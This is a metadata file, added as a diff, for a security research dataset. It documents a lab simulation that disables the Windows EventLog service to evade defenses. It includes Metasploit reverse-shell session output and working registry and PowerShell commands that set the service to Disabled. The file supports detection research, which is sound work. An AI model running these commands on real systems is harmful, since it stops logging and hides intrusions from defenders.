@@ -1,0 +1,95 @@
+title: Stopping Event Log Service via Modification of Start Up Type
+id: SDWIN-220708104215
+contributors:
+- Jose Rodriguez @Cyb3rPandaH
+creation_date: 2022/07/08
+modification_date: 2022/08/04
+platform:
+- Windows
+type: atomic
+tags:
+- powershell
+- reg
+- cmd
+- eventlog
+description: |-
+  After getting a shell with elevated privileges on the target, we modified the start up type for the EventLog service to `Disabled`.
+  
+  After the modification, we need to restart our system to make the EventLog service unavailable (Disabled). This data set contains only before-reboot data of our simulation. Even though after-reboot data is not part of the dataset, our attempt to disable the EventLog service was successful during the simulation.
+
+  We have simulated this attack using 3 different procedures: REG command via cmd.exe, REG meterpreter command (Metasploit), and the PowerShell module (Metasploit).
+
+  This dataset was generated using a Windows 10 Pro Evaluation edition (Version:1903,OS Build:18362.30) and Kali Linux (Version:2022.2).
+attack_mappings:
+  - technique: T1562
+    sub-technique: "002"
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_disable_eventlog_service_startuptype_modification.zip
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_disable_eventlog_service_startuptype_modification_via_registry.zip
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_disable_eventlog_service_startuptype_modification_via_registry.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: cmd
+      module: cmd
+    - type: Manual
+      name: Metasploit
+      module: reg
+    - type: Manual
+      name: Metasploit
+      module: powershell
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    **** Using reg command via cmd.exe:
+    
+    msf6 exploit(multi/handler) > run 
+    [*] Started HTTPS reverse handler on https://192.168.56.40:8443 
+    [*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: jhdxsqpv) Staging x64 payload (201308 bytes) ... 
+    [*] Meterpreter session 20 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 11:20:26 -0400 
+
+    meterpreter > shell 
+    Process 7728 created. 
+    Channel 1 created. 
+    Microsoft Windows [Version 10.0.18362.30] 
+    (c) 2019 Microsoft Corporation. All rights reserved. 
+    C:\Users\IT01-Pedro\Downloads>REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog /t REG_DWORD /v Start /d 4
+    REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog /t REG_DWORD /v Start /d 4 
+    Value Start exists, overwrite(Yes/No)? yes 
+    The operation completed successfully. 
+    C:\Users\IT01-Pedro\Downloads>
+
+    **** Using reg meterpreter command:
+    
+    msf6 exploit(multi/handler) > run 
+    [*] Started HTTPS reverse handler on https://192.168.56.40:8443 
+    [*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: r64afjpx) Staging x64 payload (201308 bytes) ... 
+    [*] Meterpreter session 19 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 10:50:58 -0400 
+
+    meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog' -v 'Start' -t 'REG_DWORD' -d 4 
+    Successfully set Start of REG_DWORD. 
+    meterpreter >
+
+    **** Using PowerShell module:
+
+    msf6 exploit(multi/handler) > run 
+    [*] Started HTTPS reverse handler on https://192.168.56.40:8443 
+    [*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: bgwdtwdi) Staging x64 payload (201308 bytes) ... 
+    [*] Meterpreter session 21 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 11:36:38 -0400 
+
+    meterpreter > load powershell 
+    Loading extension powershell...Success. 
+    meterpreter > powershell_execute "Set-Service -Name EventLog -StartUpType Disabled" 
+    [+] Command execution completed: 
+    meterpreter >
+references:
+- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
+- https://www.offensive-security.com/metasploit-unleashed/interacting-registry/
+- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg
